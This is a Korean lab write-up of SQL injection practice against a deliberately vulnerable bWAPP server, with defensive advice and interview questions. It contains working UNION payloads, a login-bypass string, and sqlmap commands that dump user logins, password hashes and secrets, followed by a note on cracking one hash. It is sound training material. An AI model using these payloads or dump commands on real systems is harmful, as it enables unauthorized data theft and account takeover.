# 2026-11-05 SQL Injection · sqlmap · Burp Suite 실습 총정리

> **실습 환경:** Kali Linux → 의도적으로 취약하게 구성된 bWAPP (`192.168.20.205`)  
> **실습 범위:** 수동 SQL Injection, 데이터베이스 메타데이터 조회, Blind SQLi 개념, sqlmap, AJAX/JSON HTTP 분석, Hero 로그인 폼  
> **주의:** 본 문서는 허가된 교육용 실습 환경을 기준으로 한다. 실제 서비스에 무단으로 적용하지 않는다. 세션 쿠키 등 인증 정보는 마스킹했다.

## 1. 오늘 학습 흐름

1. SQL Injection의 기본 원리와 문자열·숫자 입력 위치의 차이
2. `UNION SELECT`를 이용한 데이터베이스 구조 조회
3. `information_schema`와 `LIMIT` 이해
4. Boolean-based / Error-based / Time-based / UNION 기반 SQL Injection 구분
5. `sqlmap`으로 데이터베이스 → 테이블 → 컬럼 → 레코드 조회
6. Burp Suite로 AJAX 검색의 HTTP 요청·JSON 응답 확인
7. Hero 로그인 폼에서 정상 인증과 SQL Injection 입력 결과 비교
8. 방어 대책과 면접 대비 Q&A

---

## 2. SQL Injection 기본 원리

SQL Injection은 **사용자 입력이 SQL 구문의 일부로 해석되어 원래 의도한 질의 조건이 변경되는 취약점**이다.

예시(설명용 가상 SQL):

```sql
SELECT * FROM movies WHERE title LIKE '%사용자입력%';
```

- `'` : SQL 문자열을 닫는 데 사용될 수 있다.
- `OR 1=1` : 항상 참인 조건을 추가한다.
- `#` : MySQL에서 뒤따르는 구문을 주석 처리한다.
- **주의:** 입력이 따옴표로 감싼 문자열인지, 숫자 표현식인지에 따라 페이로드 문법이 달라진다. `1 or 1=1 #`도 문자열 내부에 머물러 있으면 SQL 논리식으로 동작하지 않는다.

**핵심:** SQL Injection은 단순히 특수문자를 입력하는 것이 아니라 **SQL 구문의 경계를 바꾸는 문제**다.

### 방어 기본 원칙

```python
# 개념 예시: 문자열 연결 대신 파라미터 바인딩
cursor.execute("SELECT * FROM movies WHERE title = %s", (title,))
```

Prepared Statement / 파라미터화 쿼리를 우선 사용한다. 입력값을 SQL 문자열에 직접 연결하지 않는다. 입력 검증과 DB 최소 권한도 병행한다.

---

## 3. UNION 기반 SQL Injection 및 메타데이터 탐색

### 3-1. UNION의 의미

`UNION`은 두 `SELECT`의 결과를 합친다. 이때 열 개수와 대응 열의 자료형 호환성이 중요하다.

실습에서 사용한 형태:

```sql
UNION SELECT 1,2,3,4,5,6,7
```

이번 bWAPP 영화 검색 실습에서 **7개 열**이 확인되었고, 뒤이어 sqlmap도 `UNION query - 7 columns`를 탐지했다.

### 3-2. 정보 스키마 조회

MySQL `information_schema`는 DB·테이블·컬럼 구조 정보를 제공한다.

| 뷰 | 용도 |
|---|---|
| `information_schema.SCHEMATA` | 데이터베이스 이름 |
| `information_schema.TABLES` | 테이블 이름 |
| `information_schema.COLUMNS` | 컬럼 이름·자료형 등 |

실습에서 확인한 URL의 핵심 부분(예시):

```text
/bWAPP/sqli_2.php?movie=0%20union%20select%201,SCHEMA_NAME,3,4,5,6,7%20from%20information_schema.SCHEMATA&action=go
```

- `%20` : URL에서 공백을 표현하는 인코딩
- `movie` : GET 파라미터
- `action=go` : 별도 GET 파라미터
- 이 실습에서는 입력을 통해 데이터베이스 이름을 화면에 표시했다.

### 3-3. heroes 테이블의 컬럼 구조

실습에서 사용한 조회식:

```sql
0 UNION SELECT 1,TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME,5,6,7
FROM information_schema.COLUMNS
WHERE TABLE_SCHEMA='bWAPP' AND TABLE_NAME='heroes'
```

실습에서 확인한 `heroes` 컬럼: `id`, `login`, `password`, `secret`.

```sql
LIMIT 3,1
```

- `LIMIT 시작오프셋, 개수`
- 오프셋은 **0부터 시작**하므로 `LIMIT 3,1`은 네 번째 행 하나를 선택한다.
- 실습 화면에서는 `secret`이라는 **컬럼 이름**이 표시되었다. 이는 `secret` 컬럼의 **실제 값**을 조회한 것과 다르다.
- `ORDER BY`가 없으면 반환 행의 순서는 보장되지 않는다. 컬럼 순서를 안정적으로 확인하려면 `ORDINAL_POSITION` 같은 정렬 기준을 명시해야 한다.

---

## 4. SQL Injection 탐지 유형 비교

| 유형 | 판별 원리 | 오늘 로그에서 확인한 단서 |
|---|---|---|
| Boolean-based Blind | 조건의 참·거짓에 따른 응답 차이 | `AND 2439=2439` |
| Error-based | DB 오류 발생 방식·내용을 이용 | `FLOOR(RAND(0)*2)` 계열 |
| Time-based Blind | 조건에 따른 응답 시간 차이 | `SLEEP(5)` |
| UNION query | 추가 `SELECT`의 결과를 응답에 결합 | `UNION ALL SELECT ...` / 7열 |

**Blind SQL Injection**은 결과가 직접 출력되지 않더라도 참·거짓이나 지연 시간으로 정보를 추론하는 방식이다. 실제 응답 시간은 네트워크 상태 등에도 영향을 받으므로 한 번의 지연만으로 확정하지 않는다.

---

## 5. sqlmap 자동화 실습

### 5-1. 대상과 요청 방식

- 대상: `http://192.168.20.205/bWAPP/sqli_13.php`
- 방식: **POST**
- 입력 파라미터: `movie=1&action=go`
- 쿠키: `PHPSESSID=<MASKED>; security_level=0`
- 실행 옵션 `-v 3`: 비교적 상세한 실행 로그 출력

실습 명령어(세션값 마스킹):

```bash
sqlmap -v 3 -u "http://192.168.20.205/bWAPP/sqli_13.php" \
  --cookie="PHPSESSID=<MASKED>; security_level=0" \
  --data="movie=1&action=go" \
  --dbs
```

### 5-2. 데이터베이스 목록 조회: `--dbs`

로그상 확인된 DB **5개**:

```text
bWAPP
drupageddon
information_schema
mysql
testdb
```

### 5-3. bWAPP 테이블 목록 조회: `-D ... --tables`

```bash
sqlmap -v 3 -u "http://192.168.20.205/bWAPP/sqli_13.php" \
  --cookie="PHPSESSID=<MASKED>; security_level=0" \
  --data="movie=1&action=go" \
  -D bWAPP --tables
```

확인된 테이블 **5개**:

```text
blog
heroes
movies
users
visitors
```

### 5-4. users 컬럼 조회: `-T users --columns`

```bash
sqlmap -v 3 -u "http://192.168.20.205/bWAPP/sqli_13.php" \
  --cookie="PHPSESSID=<MASKED>; security_level=0" \
  --data="movie=1&action=go" \
  -D bWAPP -T users --columns
```

확인된 컬럼 **9개**:

| 컬럼 | 자료형 |
|---|---|
| activated | tinyint(1) |
| activation_code | varchar(100) |
| admin | tinyint(1) |
| email | varchar(100) |
| id | int(10) |
| login | varchar(100) |
| password | varchar(100) |
| reset_code | varchar(100) |
| secret | varchar(100) |

### 5-5. 지정 컬럼 추출: `-C ... --dump`

```bash
sqlmap -v 3 -u "http://192.168.20.205/bWAPP/sqli_13.php" \
  --cookie="PHPSESSID=<MASKED>; security_level=0" \
  --data="movie=1&action=go" \
  -D bWAPP -T users -C login,password,secret,email --dump
```

- 추출된 레코드: **2개** (`A.I.M.`, `bee`)
- 지정 컬럼: `login`, `password`, `secret`, `email`
- sqlmap이 `password` 컬럼에서 해시를 인식했다.
- 사전 기반 분석에서 `A.I.M.` 계정의 비밀번호가 `bug`로 복원되었다.
- 두 실습 계정의 비밀번호 해시가 동일하게 표시되었다.
- CSV 결과 저장 위치: `/root/.local/share/sqlmap/output/192.168.20.205/dump/bWAPP/users.csv`

**중요:** `--dump`는 DB에 저장된 값을 가져오는 단계이고, 해시 크래킹은 그 값을 별도로 분석하는 단계다. SQL Injection이 곧바로 평문 비밀번호를 반환한 것은 아니다.

**보안 교훈:** SHA-1 같은 빠른 일반 해시 함수를 비밀번호 저장에 사용하지 말고 Argon2id 등 비밀번호 전용 해시와 적절한 솔트를 사용한다.

### 5-6. 로그에서 확인한 기타 사항

- DBMS: MySQL
- 웹 서버: Apache 2.2.8 (Ubuntu)
- PHP: 5.2.4 계열
- sqlmap 버전: 1.5.8 (로그에서 구버전 경고 표시)
- CAPTCHA 가능성 경고가 있었으나, 로그만으로 실제 CAPTCHA 동작을 확정할 수는 없다.
- 로그에 `resuming ...`이 표시되어 기존 sqlmap 세션 정보를 재사용한 부분이 있다.

---

## 6. Burp Suite: AJAX/JSON 검색 요청 분석

### 6-1. 실습 순서

1. Burp Suite에서 **Proxy → Intercept ON** 설정
2. Kali Firefox로 bWAPP의 **SQL Injection (AJAX/JSON/jQuery)** 메뉴 접속
3. 검색창에 `i` 입력
4. Burp Suite에서 HTTP 요청 확인
5. `Forward`로 요청 전달
6. 서버의 HTTP 응답과 JSON 데이터 확인

### 6-2. 실제 HTTP 요청(쿠키 마스킹)

```http
GET /bWAPP/sqli_10-2.php?title=i HTTP/1.1
Host: 192.168.20.205
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Referer: http://192.168.20.205/bWAPP/sqli_10-1.php
Cookie: PHPSESSID=<MASKED>; security_level=0
```

| 요소 | 해석 |
|---|---|
| `GET` | HTTP 요청 메서드 |
| `sqli_10-2.php` | AJAX 요청을 받는 엔드포인트 |
| `title=i` | 검색창에서 보낸 사용자 입력값 |
| `X-Requested-With: XMLHttpRequest` | AJAX 요청에서 흔히 사용하는 헤더 |
| `Referer` | 검색을 시작한 페이지 |
| `security_level=0` | bWAPP Low 보안 수준 |

### 6-3. 실제 HTTP 응답

```http
HTTP/1.1 200 OK
Content-Type: text/json; charset=utf-8
Content-Length: 2049
```

- `200 OK`: HTTP 요청을 서버가 정상 처리했다는 의미. **SQL Injection 성공을 의미하지는 않는다.**
- `Content-Type: text/json`: JSON 형식으로 데이터를 전달한다는 표시.
- 응답 본문: **영화 객체 8개를 담은 JSON 배열**.

실제 검색 결과 요약:

| ID | 영화 | 연도 | 장르 |
|---|---|---:|---|
| 1 | G.I. Joe: Retaliation | 2013 | action |
| 2 | Iron Man | 2008 | action |
| 4 | Terminator Salvation | 2009 | sci-fi |
| 5 | The Amazing Spider-Man | 2012 | action |
| 6 | The Cabin in the Woods | 2011 | horror |
| 7 | The Dark Knight Rises | 2012 | action |
| 8 | The Fast and the Furious | 2001 | action |
| 9 | The Incredible Hulk | 2008 | action |

JSON 객체 예시(원본의 숫자 인덱스 중복 필드는 설명을 위해 생략):

```json
{
  "id": "2",
  "title": "Iron Man",
  "release_year": "2008",
  "genre": "action",
  "main_character": "Tony Stark",
  "imdb": "tt0371746",
  "tickets_stock": "53"
}
```

원본 JSON에는 `"0":"2"`와 `"id":"2"`처럼 숫자 키와 이름 키가 함께 존재했다. PHP의 DB 결과 배열을 숫자·연관 인덱스로 동시에 가져온 결과일 가능성이 있다.

### 6-4. 검색 결과가 여러 개인 이유

`i`가 포함된 제목들이 반환되었으므로 서버가 다음과 유사한 조건으로 조회했을 **가능성**이 있다.

```sql
SELECT * FROM movies WHERE title LIKE '%i%';
```

이는 **응답에 근거한 추정**이며 실제 PHP 소스에서 확인한 SQL은 아니다.

### 6-5. 핵심 데이터 흐름

```text
Firefox 검색창에 i 입력
       ↓
GET /bWAPP/sqli_10-2.php?title=i
       ↓
Burp Suite에서 요청 가로채기
       ↓
Forward → PHP 서버 처리 / DB 조회
       ↓
HTTP 200 OK + JSON 배열(영화 8개)
       ↓
브라우저가 응답을 이용해 검색 결과 표시
```

**정리:** AJAX는 비동기 웹 통신 방식이고, JSON은 데이터 표현 형식이다. SQL Injection은 이 요청의 사용자 입력값이 서버 SQL에 안전하지 않게 삽입될 때 발생한다.

---

## 7. SQL Injection (Login Form/Hero)

### 7-1. 정상 로그인 확인

입력:

```text
ID: neo
Password: trinity
```

실제 화면 결과:

```text
Welcome Neo, how are you today?
Your secret: Oh Why Didn't I Took That BLACK Pill?
```

정상 인증 후 `Neo` 계정의 비밀 문자열이 출력되었다.

설명용 가상 SQL(실제 PHP 소스 확인 전):

```sql
SELECT * FROM heroes
WHERE login = 'neo' AND password = 'trinity';
```

### 7-2. SQL Injection 입력

```sql
' or 1=1 limit 5,1 #
```

| 부분 | 역할 |
|---|---|
| `'` | 기존 문자열을 닫으려는 입력 |
| `OR 1=1` | 항상 참인 조건을 추가 |
| `LIMIT 5,1` | 조회 결과에서 앞의 5개 행을 건너뛰고 1개 선택 |
| `#` | MySQL에서 뒤따르는 구문을 주석 처리 |

입력 후 실제 화면 결과:

```text
Welcome Seline, how are you today?
Your secret: It Wasn't The Lycans. It Was You.
```

**관찰:** 정상 입력에서는 `Neo`, 조작된 입력에서는 `Seline`의 정보가 표시되었다. 이는 사용자 입력이 조회 조건과 결과 선택에 영향을 주었으며 **인증 우회가 발생했을 가능성이 높다**는 강한 단서다. 다만 화면만으로 실제 로그인 세션이 Seline으로 변경되었는지는 확정할 수 없다.

### 7-3. LIMIT 이해

```sql
LIMIT 0,1  -- 첫 번째 행 1개
LIMIT 1,1  -- 두 번째 행 1개
LIMIT 5,1  -- 여섯 번째 행 1개
```

`OR 1=1`과 `LIMIT 5,1`의 역할은 서로 다르다.

- `OR 1=1` : 어떤 행들이 조건을 통과하는지 바꾸는 역할
- `LIMIT 5,1` : 통과한 결과 중 어느 위치의 행을 반환할지 정하는 역할

`ORDER BY`가 없으면 여섯 번째 행이 항상 Seline이라고 보장되지 않는다.

---

## 8. 보안 관점에서의 취약점·대응 정리

| 관찰·위험 | 대응 방안 |
|---|---|
| 사용자 입력이 SQL 구조를 바꿈 | Prepared Statement / 바인딩 변수 사용 |
| 인증 조건이 SQL Injection으로 변경됨 | 인증 쿼리 파라미터화, 인증·세션 처리 점검 |
| `information_schema` 등 DB 구조 노출 | DB 계정 최소 권한, 불필요한 정보 노출 억제 |
| 비밀번호 해시 유출 후 사전 대입 성공 | Argon2id 등 비밀번호 전용 해시, 고유 솔트, 강한 비밀번호 |
| 오래된 Apache/PHP 버전 노출 | 지원되는 버전으로 업그레이드 및 패치 |
| 세션 쿠키 노출 가능성 | 로그·보고서에서 세션값 마스킹, 세션 관리 강화 |
| 오류·응답 차이로 DB 정보 추론 | 일반화된 오류 처리, 모니터링·탐지, 근본적인 SQL 파라미터화 |

**주의:** PHP의 `addslashes()` 또는 문자열 이스케이프에만 의존하는 것은 충분한 방어 전략이 아니다. 문자셋·쿼리 문맥 등 조건에 따라 문제가 남을 수 있으므로 파라미터화 쿼리를 우선한다.

---

## 9. 면접 대비 Q&A

**Q1. SQL Injection이란?**  
A. 사용자 입력이 SQL 구문의 일부로 해석되어 조회 조건 변경, 데이터 유출, 인증 우회 등을 일으키는 취약점이다.

**Q2. `OR 1=1`의 의미는?**  
A. 항상 참인 조건을 추가하여 원래의 WHERE 조건을 무력화하려는 것이다. 실제 효과는 괄호·연산자 우선순위·입력 위치에 따라 달라진다.

**Q3. `UNION SELECT`의 목적은?**  
A. 기존 SELECT 결과에 다른 조회 결과를 결합하는 것이다. SQL Injection에서는 DB 구조나 데이터가 응답에 섞여 나오는지 확인하는 데 사용될 수 있다.

**Q4. `information_schema`란?**  
A. 데이터베이스·테이블·컬럼 등 메타데이터를 조회할 수 있는 MySQL 시스템 스키마다.

**Q5. `LIMIT 5,1`은 무엇인가?**  
A. 결과의 처음 5개 행을 건너뛰고 1개 행을 가져온다. 정렬을 명시하지 않으면 특정 레코드가 선택된다는 보장은 없다.

**Q6. Blind SQL Injection의 대표 방식은?**  
A. Boolean-based(응답 차이)와 Time-based(지연 시간 차이) 방식이다.

**Q7. sqlmap의 `--dbs`, `--tables`, `--columns`, `--dump`는?**  
A. 각각 데이터베이스 목록, 테이블 목록, 컬럼 목록, 실제 데이터 레코드를 조회하는 옵션이다.

**Q8. HTTP 200 OK는 SQL Injection 성공을 뜻하는가?**  
A. 아니다. HTTP 요청이 정상 처리되었다는 의미이며 SQL Injection 여부는 별도 검증이 필요하다.

**Q9. AJAX와 JSON의 차이는?**  
A. AJAX는 웹 페이지와 서버 간 비동기 통신 방식이고 JSON은 구조화된 데이터 표현 형식이다.

**Q10. 가장 중요한 SQL Injection 방어법은?**  
A. 사용자 입력을 SQL 문자열에 직접 이어 붙이지 않고 Prepared Statement로 파라미터를 바인딩하는 것이다.

---

## 10. 오늘의 핵심 암기 카드

```text
SQL Injection = 입력값이 SQL 명령으로 해석되는 문제
UNION SELECT  = 조회 결과 결합
information_schema = DB 구조 메타데이터
LIMIT 5,1     = 6번째 행 1개 (정렬 보장은 별개)
Blind SQLi    = 참/거짓 또는 시간 차이로 추론
sqlmap        = SQL Injection 테스트 자동화 도구
Burp Suite    = HTTP 요청/응답 분석 및 테스트
AJAX          = 비동기 웹 통신
JSON          = 구조화된 데이터 형식
200 OK        = HTTP 요청 정상 처리, 공격 성공 의미 아님
Prepared Statement = SQL Injection의 핵심 방어 수단
```

### 오늘의 실습 결론

오늘은 **SQL 문법 → SQL Injection → DB 구조·데이터 탐색 → 자동화 도구 → HTTP 통신 분석 → 로그인 인증 영향**까지 하나의 흐름으로 연결했다. 단순히 명령어를 외우기보다 **어느 입력값이 어디로 전달되고, 서버에서 어떻게 SQL에 사용되며, 어떤 결과가 반환되는지**를 설명할 수 있는 것이 가장 중요한 성과다.

> 🐝 bWAPP의 벌은 귀엽지만, 취약한 SQL 문자열 연결은 귀엽지 않다! 😆

*작성 기준: 2026-11-05 대화에 공유된 실습 결과 및 sqlmap 로그. 예시·추정은 해당 부분에 별도 표기.*
